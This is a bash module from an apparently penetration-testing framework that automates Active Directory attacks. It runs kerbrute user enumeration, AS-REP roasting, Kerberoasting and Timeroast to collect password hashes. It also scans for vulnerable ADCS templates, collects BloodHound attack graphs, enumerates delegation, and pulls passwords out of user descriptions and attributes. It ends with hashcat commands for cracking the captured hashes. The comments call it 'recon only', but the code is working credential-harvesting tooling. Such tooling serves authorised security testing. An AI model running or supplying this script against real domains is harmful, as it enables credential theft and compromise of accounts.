#!/usr/bin/env bash
# ==========================================================================
# 06-ad-recon.sh  -  Active Directory recon: AS-REP / Kerberoast collection
#                    and BloodHound graph collection.
#
#  RECON ONLY. This module COLLECTS data (roastable hashes for OFFLINE
#  cracking, directory objects, AD relationships). It never sprays or
#  brute-forces passwords against the domain, so it cannot lock accounts.
#  Crack any captured hashes offline, on your own hardware, out of band.
# ==========================================================================
set -euo pipefail
cd "$(dirname "$0")"
source ./config.sh
source ./lib/common.sh
RUN="${RUN:?RUN not set}"
OUT="$RUN/06-ad-recon"; mkdir -p "$OUT"; LOG="$OUT/ad.log"
DC="$RUN/hosts_dc.txt"
NXC=$(nxc_bin) || NXC=""

phase "Active Directory Recon"
if ! task_listing; then
  [[ -s "$DC" ]] || { warn "No DC identified — AD recon needs a DC. Skipping."; exit 0; }
fi
DC1=""; [[ -s "$DC" ]] && DC1=$(head -1 "$DC"); [[ -n "$DC_IP" ]] && DC1="$DC_IP"

# Username source: kerbrute-validated > harvested (03 RID-brute) > config list.
USERS="$RUN/domain_users.txt"
[[ -s "$USERS" ]] || USERS="$USER_WORDLIST"
[[ -s "$OUT/valid_users.txt" ]] && USERS="$OUT/valid_users.txt"

# netexec auth args (LDAP/SMB): use creds if present, else a null/anon session.
NE_D=();  [[ -n "$DOMAIN" ]] && NE_D=(-d "$DOMAIN")
if   [[ -n "$NTHASH"   ]]; then NE_AUTH=(-u "${USERNAME:-}" -H "$NTHASH")
elif [[ -n "$PASSWORD" ]]; then NE_AUTH=(-u "${USERNAME:-}" -p "$PASSWORD")
else                            NE_AUTH=(-u '' -p ''); fi   # null session
HAVE_CREDS=false
[[ -n "$USERNAME" && ( -n "$PASSWORD" || -n "$NTHASH" ) ]] && HAVE_CREDS=true

# ---- Sub-task: username validation via Kerberos pre-auth ------------------
# Sends AS-REQ and reads the KDC error to confirm which names exist. This is
# enumeration only — no passwords are tried, so it cannot lock accounts.
t_kerbrute() {
  { have kerbrute && [[ -s "$USERS" && -n "$DOMAIN" ]]; } \
    || { warn "kerbrute missing, no user list, or no DOMAIN — skipping."; return 0; }
  log "kerbrute userenum (validate usernames; no password attempts)"
  kerbrute userenum --dc "$DC1" -d "$DOMAIN" "$USERS" -o "$OUT/kerbrute_valid.txt" 2>/dev/null || true
  if [[ -s "$OUT/kerbrute_valid.txt" ]]; then
    grep -oiE '[A-Za-z0-9._-]+@'"$DOMAIN" "$OUT/kerbrute_valid.txt" | sed "s/@.*//" \
      | sort -u > "$OUT/valid_users.txt" 2>/dev/null || true
    [[ -s "$OUT/valid_users.txt" ]] && { USERS="$OUT/valid_users.txt"; ok "Validated $(wc -l <"$USERS") usernames -> $USERS"; }
  fi
}

# ---- Sub-task: AS-REP roasting (no creds needed) --------------------------
# Requests AS-REP for accounts that don't require Kerberos pre-auth. This is a
# directory query, not an authentication attempt — it does not touch lockout.
t_asrep() {
  if have GetNPUsers.py || have impacket-GetNPUsers; then
    local GNP; GNP=$(command -v GetNPUsers.py || command -v impacket-GetNPUsers)
    if [[ -s "$USERS" ]]; then
      log "AS-REP roasting (no auth required; offline-crackable hashes)"
      run "$LOG" "$GNP" "${DOMAIN}/" -usersfile "$USERS" -no-pass -dc-ip "$DC1" \
        -outputfile "$OUT/asrep_hashes.txt" 2>/dev/null || true
    else
      warn "No user list for AS-REP roasting — skipping."
    fi
  elif [[ -n "$NXC" && -n "$USERNAME" ]]; then
    run "$LOG" "$NXC" ldap "$DC1" -u "$USERNAME" -p "${PASSWORD:-}" --asreproast "$OUT/asrep.txt" || true
  else
    warn "No GetNPUsers / netexec available — skipping AS-REP roasting."
  fi
}

# ---- Sub-task: Kerberoasting (needs ANY valid read-only domain creds) -----
t_kerberoast() {
  [[ -n "$USERNAME" && ( -n "$PASSWORD" || -n "$NTHASH" ) ]] \
    || { warn "No domain creds set — skipping Kerberoast (set read-only creds in config.sh)."; return 0; }
  if have GetUserSPNs.py || have impacket-GetUserSPNs; then
    local GSP; GSP=$(command -v GetUserSPNs.py || command -v impacket-GetUserSPNs)
    log "Kerberoasting (requesting TGS for all SPNs; offline-crackable hashes)"
    if [[ -n "$NTHASH" ]]; then
      run "$LOG" "$GSP" "$DOMAIN/$USERNAME" -hashes ":$NTHASH" -dc-ip "$DC1" \
        -request -outputfile "$OUT/kerberoast_hashes.txt" 2>/dev/null || true
    else
      run "$LOG" "$GSP" "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$DC1" \
        -request -outputfile "$OUT/kerberoast_hashes.txt" 2>/dev/null || true
    fi
  else
    warn "GetUserSPNs not available — skipping Kerberoast."
  fi
}

# ---- Sub-task: ADCS enumeration (Certipy) — template misconfigs -----------
# Read-only directory query for vulnerable templates / CA settings (ESC1-ESC8).
t_adcs() {
  [[ -n "$USERNAME" && ( -n "$PASSWORD" || -n "$NTHASH" ) ]] \
    || { warn "No domain creds set — skipping ADCS enumeration."; return 0; }
  local CERTIPY; CERTIPY=$(command -v certipy || command -v certipy-ad || true)
  if [[ -z "$CERTIPY" ]]; then
    warn "certipy not installed — skipping ADCS enumeration (pipx install certipy-ad)."
    return 0
  fi
  log "ADCS enumeration (certipy find -vulnerable)"
  pushd "$OUT" >/dev/null
  if [[ -n "$NTHASH" ]]; then
    "$CERTIPY" find -u "$USERNAME@$DOMAIN" -hashes ":$NTHASH" -dc-ip "$DC1" \
      -vulnerable -stdout > certipy_adcs.txt 2>&1 || true
  else
    "$CERTIPY" find -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC1" \
      -vulnerable -stdout > certipy_adcs.txt 2>&1 || true
  fi
  popd >/dev/null
  if grep -qiE 'ESC[0-9]+|Vulnerab' "$OUT/certipy_adcs.txt" 2>/dev/null; then
    warn "ADCS vulnerable template(s) found -> $OUT/certipy_adcs.txt"
    grep -iE 'ESC[0-9]+|Template Name|Vulnerab' "$OUT/certipy_adcs.txt" | sort -u > "$OUT/adcs_summary.txt" || true
  else
    ok "ADCS enumerated (no vulnerable templates flagged) -> $OUT/certipy_adcs.txt"
  fi
}

# ---- Sub-task: BloodHound collection --------------------------------------
t_bloodhound() {
  [[ -n "$USERNAME" && ( -n "$PASSWORD" || -n "$NTHASH" ) ]] \
    || { warn "No domain creds set — skipping BloodHound."; return 0; }
  have bloodhound-python || { warn "bloodhound-python not installed — skipping."; return 0; }
  log "BloodHound collection (-c all)"
  mkdir -p "$OUT/bloodhound"; pushd "$OUT/bloodhound" >/dev/null
  if [[ -n "$NTHASH" ]]; then
    bloodhound-python -d "$DOMAIN" -u "$USERNAME" --hashes ":$NTHASH" \
      -ns "$DC1" -c all --zip 2>&1 | tee -a "$LOG" || true
  else
    bloodhound-python -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" \
      -ns "$DC1" -c all --zip 2>&1 | tee -a "$LOG" || true
  fi
  popd >/dev/null
  ok "BloodHound zip -> $OUT/bloodhound (import into BloodHound GUI)"
}

# ==========================================================================
# Extended AD recon (read-only). LDAP / SCCM / delegation enumeration via
# directory queries only. No spraying, brute force, or credential dumping is
# performed, so cedzo stays recon-only.
# ==========================================================================

# ---- Sub-task: LDAP recon via netexec (directory queries) -----------------
t_ldap_recon() {
  [[ -n "$NXC" ]] || { warn "netexec missing — skipping LDAP recon."; return 0; }
  local L="$OUT/ldap"; mkdir -p "$L"
  log "DC list / password-not-required / pass-pol (netexec ldap)"
  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" --dc-list              || true
  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" --password-not-required || true
  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" --pass-pol             || true
  log "MachineAccountQuota + AD subnets (netexec ldap modules)"
  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" -M maq                 || true
  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" -M subnets             || true
  log "Passwords in user descriptions / userPassword attributes (read-only)"
  "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" -M get-desc-users 2>/dev/null > "$L/desc_users.txt" || true
  grep -iE 'pass|pwd|password|pword' "$L/desc_users.txt" 2>/dev/null | sort -u > "$L/desc_creds.txt" || true
  [[ -s "$L/desc_creds.txt" ]] && warn "Possible creds in user descriptions -> $L/desc_creds.txt"
  "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" -M get-userPassword -M get-unixUserPassword \
    2>/dev/null > "$L/userpassword_attrs.txt" || true
  [[ -s "$L/userpassword_attrs.txt" ]] && ok "userPassword attrs -> $L/userpassword_attrs.txt"
}

# ---- Sub-task: delegation enumeration (attack-path recon) -----------------
t_delegation() {
  [[ -n "$NXC" ]] || { warn "netexec missing — skipping delegation enum."; return 0; }
  log "Delegation enumeration (netexec find-delegation / trusted-for-delegation)"
  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" --find-delegation        || true
  run "$LOG" "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" --trusted-for-delegation  || true
  # Richer view via impacket findDelegation (needs creds).
  local FD; FD=$(command -v findDelegation.py || command -v impacket-findDelegation || true)
  if [[ -n "$FD" && "$HAVE_CREDS" == true ]]; then
    log "impacket findDelegation"
    if [[ -n "$NTHASH" ]]; then
      "$FD" -hashes ":$NTHASH" "$DOMAIN/$USERNAME" -dc-ip "$DC1" > "$OUT/findDelegation.txt" 2>&1 || true
    else
      "$FD" "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$DC1" > "$OUT/findDelegation.txt" 2>&1 || true
    fi
    [[ -s "$OUT/findDelegation.txt" ]] && { cat "$OUT/findDelegation.txt"; ok "findDelegation -> $OUT/findDelegation.txt"; }
  fi
}

# ---- Sub-task: SCCM / MECM discovery (read-only) --------------------------
t_sccm() {
  [[ -n "$NXC" ]] || { warn "netexec missing — skipping SCCM discovery."; return 0; }
  log "SCCM / MECM discovery (netexec ldap -M sccm)"
  echo -n Y | "$NXC" ldap "$DC1" "${NE_D[@]}" "${NE_AUTH[@]}" -M sccm -o REC_RESOLVE=TRUE \
    2>&1 | tee "$OUT/sccm.txt" || true
}

# ---- Sub-task: Timeroast (collect computer-account hashes for offline crack)
# NTP-based; queries the DC and returns RID + MD5 for machine accounts. Like
# AS-REP/Kerberoast it is COLLECTION for OFFLINE cracking — no spray/lockout.
t_timeroast() {
  [[ -n "$NXC" ]] || { warn "netexec missing — skipping timeroast."; return 0; }
  log "Timeroast (NTP) — collect computer-account hashes for OFFLINE cracking"
  "$NXC" smb "$DC1" -M timeroast 2>&1 | tee "$OUT/timeroast.txt" || true
  grep -E '^[0-9]+:\$sntp-ms\$' "$OUT/timeroast.txt" 2>/dev/null | sort -u > "$OUT/timeroast_hashes.txt" || true
  [[ -s "$OUT/timeroast_hashes.txt" ]] && warn "Timeroast hashes -> $OUT/timeroast_hashes.txt (crack: hashcat -m 31300)"
}

# ---- Sub-task: full LDAP dump via ldeep (optional, read-only) -------------
t_ldeep() {
  have ldeep || { warn "ldeep not installed — skipping full LDAP dump."; return 0; }
  local d="${DOMAIN:-domain.local}" D="$OUT/ldeep"; mkdir -p "$D"
  log "Full LDAP dump via ldeep"
  if [[ "$HAVE_CREDS" == true ]]; then
    if [[ -n "$NTHASH" ]]; then
      ldeep ldap -d "$d" -u "$USERNAME" -H "$NTHASH" -s "ldap://$DC1" all "$D/$d" 2>&1 | tee "$D/ldeep_output.txt" || true
    else
      ldeep ldap -d "$d" -u "$USERNAME" -p "$PASSWORD" -s "ldap://$DC1" all "$D/$d" 2>&1 | tee "$D/ldeep_output.txt" || true
    fi
  else
    ldeep ldap -d "$d" -a -s "ldap://$DC1" all "$D/$d" 2>&1 | tee "$D/ldeep_output.txt" || true
  fi
  # Feed harvested usernames back into the shared list for AS-REP/Kerberoast.
  if [[ -s "$D/${d}_users_all.lst" ]]; then
    sort -u "$D/${d}_users_all.lst" "$RUN/domain_users.txt" -o "$RUN/domain_users.txt" 2>/dev/null \
      || cp "$D/${d}_users_all.lst" "$RUN/domain_users.txt"
    ok "ldeep harvested users merged into domain_users.txt"
  fi
}

task kerbrute   "Validate usernames via Kerberos pre-auth (kerbrute)"  t_kerbrute
task asrep      "AS-REP roasting (no creds; offline hashes)"           t_asrep
task kerberoast "Kerberoasting (needs read-only domain creds)"         t_kerberoast
task adcs       "ADCS template misconfig enum (Certipy)"               t_adcs
task bloodhound "BloodHound graph collection (-c all)"                 t_bloodhound
task ldap_recon "LDAP recon: DC-list, MAQ, subnets, desc passwords"    t_ldap_recon
task delegation "Delegation enum (unconstrained/constrained/RBCD)"     t_delegation
task sccm       "SCCM / MECM discovery (netexec)"                      t_sccm
task timeroast  "Timeroast: collect machine-acct hashes (offline)"     t_timeroast
task ldeep      "Full LDAP dump via ldeep (optional, read-only)"       t_ldeep
run_tasks

log "Crack any collected roast hashes OFFLINE (out of band):"
log "  hashcat -m 13100 $OUT/kerberoast_hashes.txt rockyou.txt   # Kerberoast"
log "  hashcat -m 18200 $OUT/asrep_hashes.txt      rockyou.txt   # AS-REP"
log "  hashcat -m 31300 $OUT/timeroast_hashes.txt  rockyou.txt   # Timeroast"
ok "AD recon module complete -> $OUT"
